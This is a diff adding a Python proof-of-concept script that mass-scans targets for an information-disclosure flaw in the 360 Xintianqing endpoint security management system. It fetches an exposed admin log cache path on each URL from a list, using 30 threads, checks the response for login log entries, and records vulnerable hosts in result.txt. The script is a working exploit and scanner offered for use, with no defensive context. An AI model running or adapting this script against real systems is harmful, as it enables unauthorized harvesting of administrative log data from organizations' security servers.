@@ -1,0 +1,58 @@
+import requests,argparse,re,sys,json
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    test="""
+░░      ░░░  ░░░░  ░░        ░
+▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒
+▓  ▓▓▓▓▓▓▓▓▓  ▓▓  ▓▓▓      ▓▓▓
+█  ████  ████    ████  ███████
+██      ██████  █████        █
+                              
+"""
+    print(test)
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='360_新天擎终端安全管理系统信息泄露漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as fb:
+            for url in fb.readlines():
+                url_list.append(url.strip())
+        mp = Pool(30)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    payload='/runtime/admin_log_conf.cache'
+    headers={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
+        'Connection': 'close',
+    }
+    proxies={
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+    try:
+        res = requests.get(url=target+payload,headers=headers,proxies=proxies,timeout=15,verify=False)
+        #print(res.text)
+        #res1=json.loads(res.text)
+        #print(res1)
+        match = re.search(r'"name";s:\d+:"(.*?)";s:4:"type";s:\d+:"TYPE_LOGIN"',res.text)
+        #print(match.group(1))
+        if res.status_code == 200 and '登录' == match.group(1):
+            print(f'[+]{target} have loopholes {target+payload}')
+            with open('result.txt','a',encoding='utf-8') as fb:
+                fb.write(target.strip()+'\n')
+    except:
+        pass
+if __name__ == "__main__":
+    main()
